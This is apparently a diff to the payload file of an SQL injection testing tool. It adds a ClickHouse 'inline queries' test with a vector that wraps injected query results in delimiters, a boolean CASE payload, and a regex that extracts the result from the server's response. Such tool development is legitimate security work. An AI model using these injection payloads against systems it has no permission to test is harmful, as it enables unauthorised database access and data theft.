@@ -133,5 +133,25 @@
             <dbms>Firebird</dbms>
         </details>
     </test>
+
+    <test>
+        <title>ClickHouse inline queries</title>
+        <stype>3</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,8</clause>
+        <where>3</where>
+        <vector>('[DELIMITER_START]'||CAST(([QUERY]) AS String)||'[DELIMITER_STOP]')</vector>
+        <request>
+            <payload>('[DELIMITER_START]'||(CASE WHEN ([RANDNUM]=[RANDNUM]) THEN '1' ELSE '0' END)||'[DELIMITER_STOP]')</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>ClickHouse</dbms>
+        </details>
+    </test>
+    
     <!-- End of inline queries tests -->
 </root>
